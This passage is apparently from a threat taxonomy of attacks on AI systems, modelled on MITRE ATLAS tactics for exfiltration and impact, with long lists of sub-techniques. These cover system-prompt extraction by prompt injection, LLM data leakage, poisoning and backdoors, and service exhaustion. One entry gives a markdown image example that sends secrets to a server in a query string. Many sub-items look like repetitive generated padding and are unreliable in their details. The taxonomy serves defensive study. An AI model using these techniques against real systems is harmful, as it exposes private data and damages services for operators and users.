          Use online learning to continuously improve extraction quality
      Exfiltration via Cyber Means: Adversaries may exfiltrate AI artifacts or other information relevant to their goals via traditional cyber means.  See the ATT&CK [Exfiltration](https://attack.mitre.org/tactics/TA0010/) tactic for more information.
        ~Model Weight Extraction: Adversaries may extract model weights and parameters through API calls, memory dumps, or file system access
        ~Training Dataset Exfiltration: Adversaries may steal training datasets through database dumps, file transfers, or intercepted data streams
        ~Model Architecture Theft: Adversaries may extract model architecture information from configuration files, documentation, or through reverse engineering
        ~Automated Model Querying: Adversaries may systematically query the model to extract information about its behavior and structure
        ~Container Image Exfiltration: Adversaries may steal containerized AI applications and their dependencies
        ~Model Checkpoint Theft: Adversaries may target and exfiltrate model checkpoints during training or deployment
        ~Framework-Specific Extraction: Adversaries may exploit AI framework-specific features to extract model information
        ~Cache-Based Exfiltration: Adversaries may extract model information from various caches (GPU memory, disk cache, etc.)
        ~API Token Theft: Adversaries may steal API tokens or credentials to access and extract AI services
        ~Configuration File Extraction: Adversaries may target configuration files containing model hyperparameters and deployment settings
        ~Development Environment Exfiltration: Adversaries may target AI development environments to steal notebooks, code, and experiments
        ~Log File Extraction: Adversaries may extract model behavior and configuration details from logging and monitoring systems
        ~Cloud Storage Transfer: Adversaries may exfiltrate AI assets stored in cloud storage through unauthorized transfers or misconfigured permissions
        ~Network Traffic Interception: Adversaries may capture network traffic between AI model components to extract information
        ~Model Registry Theft: Adversaries may target model registries to steal multiple versions of models and their metadata
        ~Inference Server Extraction: Adversaries may exploit model serving infrastructure to extract model information
        ~Pipeline Configuration Theft: Adversaries may steal ML pipeline configurations and workflows
        ~Experiment Tracking Exfiltration: Adversaries may target experiment tracking systems to steal model metrics and parameters
        ~Version Control Repository Theft: Adversaries may exfiltrate entire AI project repositories containing code and configurations
        ~Batch Inference Data Theft: Adversaries may steal large collections of inference results to reconstruct model behavior
        ~Hardware Accelerator Memory Extraction: Adversaries may extract model information directly from GPU or TPU memory
        ~Distributed Training Data Interception: Adversaries may exploit distributed training systems to capture model updates
        ~Backup System Exploitation: Adversaries may target AI system backups to steal complete snapshots of models and data
        ~Third-party Service Token Extraction: Adversaries may steal credentials for integrated AI services and APIs
        ~Debug Interface Exploitation: Adversaries may extract model information through debugging and profiling interfaces
        ~Model Compression Artifact Theft: Adversaries may target compressed or quantized model formats during deployment
        ~Feature Store Exfiltration: Adversaries may steal feature definitions and preprocessed data from feature stores
        ~Model Evaluation Data Theft: Adversaries may extract validation datasets and evaluation metrics
        ~AutoML Configuration Extraction: Adversaries may steal automated machine learning configurations and results
        ~Edge Device Model Extraction: Adversaries may extract deployed models from edge devices or IoT endpoints
        ~Performance Profiling Data Theft: Adversaries may extract model performance optimization data and bottleneck analysis
        ~Model Explainability Output Extraction: Adversaries may steal model interpretability data and feature importance information
        ~Data Lineage System Exploitation: Adversaries may extract data provenance and transformation history
        ~Governance Platform Exfiltration: Adversaries may steal model governance, compliance, and audit trail information
        ~Pre-trained Model Repository Theft: Adversaries may extract fine-tuning parameters and transfer learning artifacts
        ~Model Testing Harness Extraction: Adversaries may steal test suites and testing infrastructure configurations
        ~Deployment Specification Theft: Adversaries may extract model serving specifications and scaling configurations
        ~Model Monitoring System Exploitation: Adversaries may steal production monitoring data and drift detection configurations
        ~A/B Testing Data Extraction: Adversaries may steal comparison data from model experiments and variants
        ~Model Documentation System Theft: Adversaries may extract detailed documentation about model design and implementation
      Extract LLM System Prompt: Adversaries may attempt to extract a large language model's (LLM) system prompt. This can be done via prompt injection to induce the model to reveal its own system prompt or may be extracted from a configuration file.  System prompts can be a portion of an AI provider's competitive advantage and are thus valuable intellectual property that may be targeted by adversaries.
        ~Prompt Injection Attack: Adversaries may craft specific prompts designed to trick the LLM into revealing its system prompt through carefully constructed queries or commands.
        ~Configuration File Access: Adversaries may attempt to access configuration files, environment variables, or deployment manifests that contain the system prompt.
        ~Model Weight Analysis: Adversaries may attempt to extract the system prompt by analyzing the model's weights or performing model inversion attacks.
        ~API Parameter Manipulation: Adversaries may manipulate API parameters or debug endpoints to reveal system prompt information.
        ~Cache Exploitation: Adversaries may attempt to access cached responses or temporary storage that contains system prompt information.
      LLM Data Leakage: Adversaries may craft prompts that induce the LLM to leak sensitive information. This can include private user data or proprietary information. The leaked information may come from proprietary training data, data sources the LLM is connected to, or information from other users of the LLM.
        ~Training Data Extraction: Adversaries craft prompts to make the LLM reveal specific pieces of its training data, including copyrighted content, personal information, or proprietary data
        ~System Prompt Extraction: Adversaries attempt to reveal the system prompts or instructions that define the LLM's behavior and constraints
        ~Context Window Exploitation: Adversaries manipulate the context window to access information from previous conversations or cached data
        ~Role-Playing Attacks: Adversaries impersonate authorized roles or entities to trick the LLM into revealing sensitive information
        ~Token Boundary Manipulation: Adversaries exploit how the LLM processes token boundaries to extract information that would normally be filtered
        ~API Parameter Manipulation: Adversaries modify API parameters, temperature settings, or other configuration values to bypass safety measures and extract sensitive information
        ~Chained Prompt Injection: Adversaries use a series of seemingly innocuous prompts that, when combined, bypass security measures and leak sensitive data
        ~Output Format Manipulation: Adversaries request outputs in specific formats (like code, JSON, or markdown) to bypass content filters
        ~Cross-User Data Leakage: Adversaries exploit shared context or memory between user sessions to extract information from other users' interactions
        ~Knowledge Cache Poisoning: Adversaries intentionally poison the LLM's temporary memory or fine-tuning data to enable future data extraction
        ~Mathematical Expression Exploitation: Adversaries use mathematical or logical expressions to encode and extract sensitive information that might bypass text-based filters
        ~Template Injection: Adversaries use template-based prompts that exploit the LLM's text completion features to reveal sensitive information
        ~Embedded Command Extraction: Adversaries exploit the LLM's ability to process embedded commands or special characters to bypass security controls
        ~Recursive Prompt Refinement: Adversaries iteratively refine prompts based on previous responses to gradually extract sensitive information
        ~Language-Switching Attacks: Adversaries use multiple languages or translation requests to bypass content filters and extract sensitive information
        ~Semantic Transformation Attacks: Adversaries rephrase sensitive information requests using synonyms, metaphors, or analogies to bypass content filters
        ~Model Behavior Probing: Adversaries systematically probe the model's responses to infer sensitive information from its behavior patterns
        ~Timing Analysis Exploitation: Adversaries analyze response timing variations to infer the presence of sensitive information
        ~Emotional Manipulation: Adversaries exploit the LLM's emotion-related responses to extract sensitive information
        ~Context Confusion: Adversaries create ambiguous contexts that cause the LLM to mix public and private information in responses
      LLM Response Rendering: An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images which automatically make a request to an adversary controlled server, or clickable links which require user interaction.  For example, an LLM may produce the following markdown: ``` ![ATLAS](https://atlas.mitre.org/image.png?secrets=private_data) ```  Which is rendered by the client as: ``` <img src="https://atlas.mitre.org/image.png?secrets=private_data"> ```  When the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.
        ~HTML Image Source: Embedding sensitive data in image source URLs that trigger automatic requests
        ~Markdown Link Injection: Creating markdown links that contain encoded sensitive data
        ~CSS Resource Loading: Using CSS @import or background-image properties to trigger requests
        ~JavaScript URI Schemes: Embedding data in javascript: URI schemes that execute when rendered
        ~SVG Content Loading: Using SVG elements with external references to trigger requests
        ~Meta Refresh Redirects: Using meta refresh tags to redirect with embedded data
        ~Custom Protocol Handlers: Exploiting custom protocol handlers to trigger external applications
        ~Web Font Loading: Using @font-face rules to trigger requests with embedded data
        ~Media Element Sources: Embedding data in audio/video source attributes
        ~Favicon Requests: Using favicon.ico requests to transmit data
        ~XML External Entity Loading: Using XXE in XML responses to trigger external requests
        ~WebSocket Connection Triggers: Embedding WebSocket connection requests in rendered content
        ~Service Worker Registration: Exploiting service worker registration to establish data channels
        ~Frame Source Loading: Using iframe/frame elements to load external resources with embedded data
        ~Web Storage Events: Triggering storage events that can broadcast data across origins
        ~Dynamic Script Loading: Using dynamic script insertion to execute external requests
        ~Form Auto-submission: Embedding forms that automatically submit data
        ~Browser Extension APIs: Exploiting browser extension communication channels
        ~Web Component Loading: Using custom element definitions to trigger external requests
        ~Data URL Schemes: Embedding sensitive data in data: URLs that get processed on render
    Impact: The adversary is trying to manipulate, interrupt, erode confidence in, or destroy your AI systems and data.  Impact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries' goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.
      Evade AI Model: Adversaries can [Craft Adversarial Data](/techniques/AML.T0043) that prevent a AI model from correctly identifying the contents of the data. This technique can be used to evade a downstream task where AI is utilized. The adversary may evade AI based virus/malware detection, or network scanning towards the goal of a traditional cyber attack.
        ~Gradient-Based Perturbation: Add carefully calculated noise to input data using model gradients to cause misclassification while maintaining visual similarity
        ~Physical World Attacks: Modify physical objects to fool AI perception systems (e.g., adding stickers to stop signs)
        ~Transfer Learning Attacks: Exploit model transfer learning vulnerabilities by crafting adversarial examples that work across multiple models
        ~Black Box Probing: Systematically query the model to understand decision boundaries and craft evasive inputs
        ~Input Preprocessing Attack: Modify data before model preprocessing steps to bypass detection while preserving malicious functionality
        ~Model Extraction and Replay: Extract model knowledge through queries then use it to generate evasive inputs
        ~Feature Space Manipulation: Modify specific features that models use for decision-making while preserving malicious intent
        ~Ensemble Model Evasion: Create adversarial examples that can evade multiple different AI models simultaneously
        ~Temporal Attack Patterns: Exploit time-series or sequential model vulnerabilities through carefully crafted input sequences
        ~Natural Perturbation: Use naturally occurring variations or transformations that preserve semantic meaning but cause misclassification
        ~Model Confidence Exploitation: Manipulate input to target areas where model has low confidence or decision boundaries
        ~Data Poisoning Replay: Use knowledge of poisoned training data to craft inputs that exploit learned vulnerabilities
        ~Architecture-Specific Bypass: Exploit known weaknesses in specific model architectures (CNN, RNN, Transformer)
        ~Cross-Modal Evasion: Exploit AI systems that combine multiple modalities (text, image, audio) by manipulating cross-modal relationships
        ~Semantic Preservation Attack: Modify inputs while maintaining semantic meaning using synonyms, paraphrasing, or style transfers
        ~Context Manipulation: Change the context or surrounding elements while keeping the malicious content intact
        ~Rate-Limited Probing: Gradually test and refine evasion techniques while staying under detection thresholds
        ~Adaptive Evasion: Dynamically adjust evasion strategy based on model feedback or defensive measures
        ~Pipeline Component Bypass: Target vulnerabilities in data preprocessing, tokenization, or feature extraction steps
        ~Hardware-Level Manipulation: Exploit hardware accelerator vulnerabilities or quantization artifacts to cause misclassification
        ~Cache Poisoning: Manipulate model cache or optimization structures to affect inference results
        ~Attention Mechanism Exploitation: Target attention mechanisms in transformers and other architectures to misdirect model focus
        ~Embedding Space Manipulation: Modify input representations in the embedding space to cause misclassification
        ~Resource Constraint Exploitation: Leverage system resource limitations to force model fallbacks or degraded performance modes
        ~Inference-Time Manipulation: Exploit batch processing or real-time inference vulnerabilities
      Denial of AI Service: Adversaries may target AI-enabled systems with a flood of requests for the purpose of degrading or shutting down the service. Since many AI systems require significant amounts of specialized compute, they are often expensive bottlenecks that can become overloaded. Adversaries can intentionally craft inputs that require heavy amounts of useless compute from the AI system.
        ~Input Flooding: Overwhelming AI systems by sending a large volume of simultaneous inference requests, exceeding the system's processing capacity
        ~Compute-Intensive Prompts: Crafting specific inputs designed to maximize computational resource usage and processing time
        ~Memory Exhaustion: Creating inputs that force the AI system to consume excessive memory resources
        ~Token Maximization: Deliberately using inputs that reach token limits or require maximum context window usage
        ~Parallel Request Coordination: Coordinating multiple sources to simultaneously request AI services
        ~Resource Locking: Creating requests that lock critical resources for extended periods
        ~Pipeline Bottleneck Exploitation: Targeting specific components in the AI pipeline known to have limited throughput
        ~Batch Processing Disruption: Manipulating batch sizes and timing to create processing queues and delays
        ~GPU Memory Saturation: Crafting inputs that maximize GPU memory usage and create processing bottlenecks
        ~Service Queue Flooding: Overwhelming service queues with numerous pending requests to prevent legitimate usage
        ~Model Weight Thrashing: Forcing frequent model switching or loading that exhausts memory bandwidth and storage I/O
        ~Temperature Manipulation: Exploiting temperature-based sampling parameters to force excessive computation
        ~Distributed Token Farming: Using multiple accounts or endpoints to accumulate and exhaust token quotas
        ~Inference Time Amplification: Crafting inputs that trigger worst-case inference time behaviors
        ~API Rate Limit Exhaustion: Systematically consuming API rate limits across multiple endpoints or users
        ~Cache Poisoning: Deliberately invalidating model caches to force recomputation
        ~Attention Mechanism Overload: Crafting inputs that maximize attention computation overhead
        ~Resource Quota Depletion: Systematically exhausting resource quotas in cloud-based AI services
        ~Training Pipeline Disruption: Targeting online learning or fine-tuning processes to consume excessive resources
        ~Gradient Computation Exhaustion: Crafting inputs that maximize backpropagation computational costs
        ~Multi-Modal Resource Binding: Forcing concurrent processing of multiple modalities to amplify resource usage
        ~Checkpoint Synchronization Blocking: Exploiting distributed training synchronization to create bottlenecks
        ~Dynamic Batching Manipulation: Exploiting dynamic batching algorithms to create processing inefficiencies
        ~Hardware Accelerator Saturation: Targeting specific hardware accelerator limitations (TPU/FPGA)
        ~Quantization Bypass: Forcing full-precision computation by avoiding quantized paths
      Spamming AI System with Chaff Data: Adversaries may spam the AI system with chaff data that causes increase in the number of detections. This can cause analysts at the victim organization to waste time reviewing and correcting incorrect inferences.
        ~Automated Query Generation: Adversaries may use automated tools to generate large volumes of queries designed to trigger false positives in AI detection systems
        ~Adversarial Input Injection: Adversaries may inject specially crafted inputs that exploit known biases or weaknesses in AI models to generate false detections
        ~Data Poisoning Through API: Adversaries may leverage public APIs to continuously submit chaff data that pollutes the AI system's detection pipeline
        ~Model Retraining Exploitation: Adversaries may submit chaff data during model retraining periods to influence future detection capabilities
        ~Distributed Chaff Campaign: Adversaries may coordinate multiple sources to submit chaff data simultaneously, overwhelming detection systems
        ~Pattern-Based Noise Generation: Adversaries may analyze detection patterns and generate noise that specifically targets common detection rules
        ~Legitimate Traffic Mimicry: Adversaries may generate chaff data that closely resembles legitimate traffic to make filtering more difficult
        ~Time-Based Flooding: Adversaries may time their chaff data submission to coincide with peak processing periods to maximize impact
      Erode AI Model Integrity: Adversaries may degrade the target model's performance with adversarial data inputs to erode confidence in the system over time. This can lead to the victim organization wasting time and money both attempting to fix the system and performing the tasks it was meant to automate by hand.
        ~Targeted Data Poisoning: Adversaries may inject carefully crafted malicious samples into training data to degrade model performance on specific targets while maintaining performance on other inputs
        ~Universal Data Poisoning: Adversaries may poison training data to degrade model performance across all inputs rather than targeting specific cases
        ~Input Perturbation: Adversaries may add subtle modifications to input data that cause the model to produce incorrect outputs while appearing normal to human observers
        ~Model Fine-tuning Manipulation: Adversaries may manipulate the fine-tuning process to gradually degrade model performance while maintaining apparent normal operation
        ~Confidence Score Manipulation: Adversaries may exploit model uncertainty to make it produce low confidence scores on valid inputs, reducing trust in the system
        ~Output Distribution Shifting: Adversaries may cause gradual shifts in the model's output distribution to reduce its reliability over time
        ~Transfer Learning Poisoning: Adversaries may poison pre-trained models used for transfer learning to impact downstream tasks
        ~Backdoor Injection: Adversaries may insert hidden triggers that cause degraded performance only when activated
        ~Temporal Attack Patterns: Adversaries may implement attacks that manifest only under specific temporal conditions to avoid detection
        ~Feature Space Manipulation: Adversaries may modify the feature space representation to cause systematic errors in model predictions
        ~Concept Drift Exploitation: Adversaries may deliberately manipulate input patterns to accelerate natural concept drift, making the model increasingly obsolete
        ~Resource Exhaustion Attack: Adversaries may submit inputs that cause the model to consume excessive computational resources, degrading performance over time
        ~Feedback Loop Poisoning: Adversaries may manipulate feedback mechanisms in online learning systems to gradually corrupt model updates
        ~Decision Boundary Manipulation: Adversaries may systematically push decision boundaries to create increasing uncertainty in model predictions
        ~Cross-Model Contamination: Adversaries may exploit model dependencies to propagate degradation across multiple connected AI systems
        ~Data Distribution Poisoning: Adversaries may gradually alter the input distribution to make the model's training data increasingly unrepresentative
        ~Ensemble Attack: Adversaries may target multiple components of an AI system simultaneously to create compound degradation effects
        ~Model Calibration Attack: Adversaries may manipulate calibration data to make the model increasingly overconfident or underconfident
        ~Interpretability Attack: Adversaries may poison model behavior to make its decisions increasingly difficult to interpret or explain
        ~Recovery Prevention: Adversaries may implement attacks that persist even after attempted model retraining or recovery procedures
        ~Model Architecture Exploitation: Adversaries may target specific architectural vulnerabilities in neural networks or other model types to cause systematic degradation
        ~Data Pipeline Corruption: Adversaries may compromise data preprocessing or augmentation pipelines to gradually introduce errors into the model's input stream
        ~Optimization Attack: Adversaries may manipulate the model's optimization process during updates to induce subtle degradation
        ~Edge Case Amplification: Adversaries may systematically identify and exploit edge cases to expand regions of model failure
        ~Multi-Modal Attack: Adversaries may target interactions between different input modalities to create compound failure modes
        ~Inference-Time Parameter Manipulation: Adversaries may tamper with model parameters during inference to cause sporadic failures
        ~Training Infrastructure Attack: Adversaries may compromise distributed training systems to introduce inconsistencies across model replicas
        ~Version Control Poisoning: Adversaries may manipulate model versioning systems to reintroduce vulnerable states
        ~Hardware-Level Model Degradation: Adversaries may exploit hardware accelerator vulnerabilities to degrade model performance
        ~Checkpoint Poisoning: Adversaries may corrupt model checkpoints to prevent successful recovery to previous stable states
        ~Model Governance Exploitation: Adversaries may manipulate model validation and governance processes to allow degraded models to pass quality checks
        ~A/B Testing Manipulation: Adversaries may poison A/B testing results to cause deployment of compromised model variants
        ~Monitoring System Evasion: Adversaries may design attacks that specifically evade model performance monitoring systems
        ~API-Level Degradation: Adversaries may exploit API interfaces to systematically degrade model performance while maintaining expected API behavior
        ~Model Serving Attack: Adversaries may compromise model serving infrastructure to introduce inconsistencies across different serving instances
        ~Deployment Environment Poisoning: Adversaries may manipulate the model's deployment environment to cause context-specific failures
        ~Quality Metric Manipulation: Adversaries may design attacks that maintain monitored quality metrics while degrading actual performance
        ~Automated Retraining Exploitation: Adversaries may poison automated model retraining pipelines to persist degradation across model updates
        ~Load Balancer Attack: Adversaries may exploit load balancing systems to create inconsistent model behavior across different instances
        ~Model Registry Poisoning: Adversaries may compromise model registries to deploy subtly degraded model versions
      Cost Harvesting: Adversaries may target different AI services to send useless queries or computationally expensive inputs to increase the cost of running services at the victim organization. Sponge examples are a particular type of adversarial data designed to maximize energy consumption and thus operating cost.
        ~Resource-Intensive Queries: Adversaries craft inputs that require maximum computational resources (memory, CPU, GPU) to process, such as complex nested structures or large-dimensional tensors
        ~API Request Flooding: Adversaries automate massive numbers of API calls to ML services to exhaust paid API quotas or increase usage-based billing
        ~Training Data Poisoning for Cost: Adversaries inject data that makes model training significantly more expensive by requiring more epochs or computing resources
        ~Model Architecture Exploitation: Adversaries probe and exploit specific model architectures with inputs known to cause maximum computational overhead
        ~Batch Processing Attacks: Adversaries manipulate batch sizes and input patterns to force worst-case computational scenarios
        ~Transfer Learning Exploitation: Adversaries target transfer learning processes with inputs that maximize computational costs during model adaptation
        ~GPU Memory Exhaustion: Adversaries craft inputs specifically designed to maximize GPU memory usage and force costly scaling
        ~Distributed Inference Attacks: Adversaries coordinate distributed attacks to simultaneously increase computational load across multiple service endpoints
        ~Auto-scaling Exploitation: Adversaries trigger cloud auto-scaling mechanisms with sustained load to increase infrastructure costs
        ~Pricing Model Exploitation: Adversaries analyze and exploit specific pricing models of AI services to maximize cost impact per request
        ~Checkpoint Generation Abuse: Adversaries force excessive model checkpointing operations to increase storage costs and I/O overhead
        ~Fine-tuning Cost Amplification: Adversaries trigger unnecessary model fine-tuning operations by manipulating input data distribution
        ~Cache Poisoning: Adversaries manipulate model caching mechanisms to reduce cache hit rates and increase computational costs
        ~Quantization Reversion: Adversaries craft inputs that force quantized models to fall back to full precision computation
        ~Data Pipeline Congestion: Adversaries exploit data preprocessing pipelines with inputs that maximize preprocessing overhead
        ~Model Ensemble Forcing: Adversaries craft inputs that force evaluation across multiple ensemble models instead of early stopping
        ~Gradient Computation Exploitation: Adversaries trigger unnecessary gradient computations in online learning scenarios
        ~Feature Extraction Overhead: Adversaries target feature extraction processes with inputs that maximize computational complexity
        ~Cross-Model Transfer Attacks: Adversaries force unnecessary model switching or loading in multi-model serving systems
        ~Model Compilation Abuse: Adversaries trigger repeated model compilation or optimization processes
        ~Federated Learning Cost Amplification: Adversaries participate in federated learning systems to inject computationally expensive model updates
        ~Hardware Accelerator Locking: Adversaries craft inputs that monopolize specialized AI accelerator hardware (TPUs, FPGAs) for maximum duration
        ~Multi-tenant Resource Starvation: Adversaries exploit shared resources in multi-tenant AI platforms to impact multiple customers' costs
        ~Model Versioning Abuse: Adversaries force continuous model version switches to increase storage and loading costs
        ~Dynamic Batching Disruption: Adversaries prevent efficient batch processing by manipulating input timing and characteristics
        ~Hyperparameter Search Exploitation: Adversaries trigger unnecessary hyperparameter optimization processes
        ~Model Compression Reversal: Adversaries force decompression of compressed models through specific input patterns
        ~Memory Swapping Inducement: Adversaries craft inputs that force excessive memory swapping between RAM and disk
        ~Load Balancer Manipulation: Adversaries exploit load balancing algorithms to prevent efficient resource distribution
        ~Inference Pipeline Fragmentation: Adversaries break efficient inference pipelines to force costly reconfigurations
        ~Edge Device Resource Depletion: Adversaries target edge AI deployments to drain battery life and increase device replacement costs
        ~Model Pruning Reversal: Adversaries craft inputs that force pruned models to behave like full models, negating efficiency gains
        ~Cross-Region Model Transfer: Adversaries force unnecessary data and model transfers between geographic regions to increase network costs
        ~Knowledge Distillation Bypass: Adversaries create inputs that make student models consistently fall back to teacher models
        ~Warm-up Period Extension: Adversaries manipulate model warm-up phases to extend resource initialization costs
        ~Container Orchestration Abuse: Adversaries trigger unnecessary container spawning and scheduling operations
        ~Model Registry Flooding: Adversaries force excessive model versions to be maintained in model registries
        ~Neural Architecture Search Triggering: Adversaries cause unnecessary neural architecture search operations
        ~Hybrid Cloud Cost Amplification: Adversaries force workload shifting between on-premise and cloud resources
        ~Inter-Service Communication Flooding: Adversaries trigger excessive communication between microservices in AI platforms
        ~Experiment Tracking Abuse: Adversaries trigger excessive logging and metric collection in ML experiment tracking systems
        ~Expert Model Activation: Adversaries craft inputs that activate maximum number of experts in mixture-of-experts models
        ~MLOps Pipeline Triggering: Adversaries force unnecessary CI/CD pipeline executions for AI models
        ~Dataset Version Proliferation: Adversaries cause excessive dataset versions to be maintained in data versioning systems
        ~Monitoring System Overload: Adversaries trigger excessive model monitoring and observability system operations
        ~A/B Testing Manipulation: Adversaries manipulate A/B testing systems to maintain multiple production models longer than necessary
        ~AutoML Cost Amplification: Adversaries trigger resource-intensive automated machine learning operations
        ~Model Quality Check Flooding: Adversaries force continuous execution of model quality and validation checks
        ~Feature Store Abuse: Adversaries trigger excessive feature computation and storage in feature stores
        ~Model Artifact Replication: Adversaries force unnecessary replication of model artifacts across serving infrastructure
      External Harms: Adversaries may abuse their access to a victim system and use its resources or capabilities to further their goals by causing harms external to that system. These harms could affect the organization (e.g. Financial Harm, Reputational Harm), its users (e.g. User Harm), or the general public (e.g. Societal Harm).
        Financial Harm: Financial harm involves the loss of wealth, property, or other monetary assets due to theft, fraud or forgery, or pressure to provide financial resources to the adversary.
          Use compromised AI trading systems to execute unauthorized trades benefiting the adversary
          Manipulate AI-powered fraud detection systems to allow fraudulent transactions
          Deploy adversarial attacks on AI pricing algorithms to cause pricing errors for financial gain
          Exploit AI chatbots to social engineer users into making fraudulent wire transfers
          Poison training data of credit scoring models to approve fraudulent loan applications
          Manipulate AI-based insurance claim assessment systems to approve false claims
          Use AI systems to generate deepfake content for financial extortion
          Exploit AI-powered payment processing systems to process unauthorized transactions
          Manipulate AI recommendation systems to promote scam products/services
          Use compromised AI systems to mine cryptocurrency using victim's resources
          Manipulate AI forecasting models to cause incorrect financial planning decisions
          Exploit AI-based identity verification systems to commit identity theft
          Use compromised AI customer service systems to approve fraudulent refunds/returns
          Manipulate AI supply chain optimization systems to trigger unnecessary purchases
          Exploit AI-powered expense management systems to approve fraudulent claims
          Use compromised AI systems to generate fake invoices/financial documents
          Manipulate AI-based credit card transaction monitoring to bypass spending limits
          Exploit AI contract analysis systems to hide unfavorable terms
          Use AI systems to automate large-scale financial scam operations
          Manipulate AI-powered auction/bidding systems to influence pricing
          Manipulate AI-powered accounting systems to conceal fraudulent transactions
          Exploit AI investment advisory systems to push high-risk or fraudulent investments
          Use compromised AI tax processing systems to divert tax refunds
          Manipulate AI payroll systems to generate ghost employees or unauthorized payments
          Exploit AI-based market making systems to conduct wash trading
          Use AI systems to automate coordinated pump-and-dump schemes
          Manipulate AI-powered subscription billing systems to generate fraudulent charges
          Exploit AI-based business valuation systems to inflate company worth
          Use compromised AI systems to generate fake financial performance metrics
          Manipulate AI-powered loyalty/rewards programs for fraudulent point accumulation
          Exploit AI risk assessment systems to hide high-risk financial activities
          Manipulate AI compliance monitoring systems to bypass financial regulations
          Use compromised AI digital wallet systems to intercept cryptocurrency transfers
          Exploit AI-based asset tracking systems to misrepresent collateral value
          Manipulate AI insurance underwriting systems to obtain fraudulent policies
          Use AI systems to automate mass financial phishing campaigns
          Exploit AI-powered pension fund management systems to misappropriate funds
          Manipulate AI-based credit union systems to create phantom accounts
          Use compromised AI systems to generate fake financial audit reports
          Exploit AI-powered microlending platforms for loan stacking fraud
        Reputational Harm: Reputational harm involves a degradation of public perception and trust in organizations.  Examples of reputation-harming incidents include scandals or false impersonations.
          Generate deepfake videos of company executives making controversial statements using AI voice cloning and video synthesis
          Manipulate AI chatbot responses to provide offensive or biased answers to users
          Create fake customer service interactions using compromised AI systems to damage brand trust
          Use AI to mass-generate negative reviews and complaints across social media platforms
          Deploy compromised AI models to produce discriminatory outputs that appear to come from the organization
          Manipulate training data to make AI models generate inappropriate or offensive content
          Create synthetic media showing false misconduct or unethical behavior by organization members
          Use AI to automate coordinated disinformation campaigns targeting the organization
          Exploit AI content filters to allow harmful content through while appearing to be organization-approved
          Generate fake internal documents or communications using AI language models to simulate scandals
          Manipulate AI model predictions to expose sensitive user data, creating privacy scandals
          Create false demonstrations of AI system bias against protected groups to trigger regulatory investigations
          Plant backdoors in AI models that activate during high-profile public demonstrations
          Manipulate AI systems to generate false research results, damaging academic credibility
          Use compromised AI systems to leak apparent internal decision-making processes
          Generate synthetic whistleblower claims about AI development practices
          Create false evidence of AI system safety violations
          Exploit AI models to generate seemingly authentic insider trading patterns
          Manipulate AI systems to produce false environmental impact reports
          Create synthetic scenarios showing AI systems being used for unauthorized surveillance
          Trigger AI system failures during critical public events or demonstrations
          Manipulate AI systems to expose apparent preferential treatment of certain user groups
          Create false evidence of AI systems being used for unauthorized political purposes
          Generate synthetic scenarios showing AI models providing dangerous medical advice
          Manipulate AI systems to produce inconsistent responses across different demographics
          Create evidence of AI models being used to circumvent regulatory requirements
          Generate false records of AI system downtime affecting critical services
          Manipulate AI systems to produce contradictory responses in different languages
          Create synthetic scenarios of AI models violating data sovereignty laws
          Generate false evidence of AI systems being used for unauthorized market manipulation
        Societal Harm: Societal harms might generate harmful outcomes that reach either the general public or specific vulnerable groups such as the exposure of children to vulgar content.
          Mass Disinformation Generation: Use AI systems to create and spread false information at scale, undermining public trust and social stability
          Demographic Bias Amplification: Exploit or amplify existing biases in AI systems to discriminate against specific groups
          Critical Infrastructure Disruption: Manipulate AI systems controlling public services or infrastructure
          Automated Hate Speech Propagation: Use AI to generate and spread hate speech targeting specific communities
          Environmental Resource Misallocation: Manipulate AI systems managing environmental resources or monitoring systems
          Public Health Misinformation: Generate false medical advice or health-related content
          Electoral Process Manipulation: Use AI to influence voting behavior or spread election-related disinformation
          Cultural Heritage Destruction: Generate content that degrades or misrepresents cultural values and traditions
          Educational System Disruption: Manipulate AI-based educational tools to spread harmful content
          Social Cohesion Undermining: Generate content designed to increase social division and conflict
          Market Manipulation: Use AI systems to create artificial market panic or economic instability
          Research Integrity Compromise: Generate false or misleading scientific data/papers to undermine scientific progress
          Mass Psychological Manipulation: Deploy AI systems to cause widespread anxiety or psychological distress
          Privacy Norm Degradation: Normalize privacy violations through systematic AI-driven surveillance
          Youth Development Disruption: Target AI systems used by young people to affect their development and future outcomes
          Professional Trust Erosion: Generate content that undermines trust in professional institutions and experts
          Digital Commons Pollution: Flood shared digital spaces with harmful content to make them unusable
          Algorithmic Addiction Exploitation: Manipulate AI systems to enhance addictive behaviors in populations
          Intergenerational Resource Depletion: Use AI systems to accelerate unsustainable resource consumption
          Social Safety Net Disruption: Compromise AI systems that manage or allocate social services
          Civil Rights Suppression: Manipulate AI systems to interfere with freedom of assembly, expression, or other civil liberties
          Justice System Manipulation: Compromise AI-based legal tools to undermine equal justice
          International Conflict Escalation: Use AI systems to heighten tensions between nations or cultures
          Emergency Response Disruption: Interfere with AI-powered emergency management systems
          Communication Channel Degradation: Compromise AI-based communication systems to isolate communities
          Human Trafficking Facilitation: Exploit AI systems to enable human trafficking or forced labor
          Food Security Destabilization: Manipulate AI systems managing food supply chains or agricultural systems
          Public Space Safety Compromise: Use AI systems to create unsafe conditions in shared spaces
          Historical Record Manipulation: Generate false historical narratives or manipulate digital archives
          Generational Knowledge Transfer Disruption: Compromise AI systems used for preserving and transmitting cultural knowledge
        User Harm: User harms may encompass a variety of harm types including financial and reputational that are directed at or felt by individual victims of the attack rather than at the organization level.
          Generate fake personal recommendations to manipulate user purchasing decisions
          Create deepfake content to damage individual reputation
          Use compromised AI system to expose private user conversations or data
          Generate targeted misinformation to manipulate specific users' beliefs or actions
          Exploit AI-powered financial services to conduct personalized fraud
          Use AI system to generate customized phishing content for specific users
          Manipulate AI-based credit scoring or assessment systems affecting individual users
          Generate false accusations or misleading content about specific individuals
          Exploit AI chatbots to extract sensitive personal information from users
          Use AI to automate harassment or bullying of specific users
          Manipulate AI-powered medical diagnosis systems to provide incorrect health advice
          Generate false professional credentials or references to damage career prospects
          Use AI to impersonate trusted contacts in personal relationships
          Manipulate AI-based authentication systems to deny access to essential services
          Generate synthetic voice content to conduct personalized vishing attacks
          Exploit AI-powered personal security systems to compromise home security
          Manipulate AI-based insurance assessment systems affecting individual coverage
          Generate false academic credentials or plagiarized content damaging educational standing
          Use AI to create targeted addiction-exploiting content
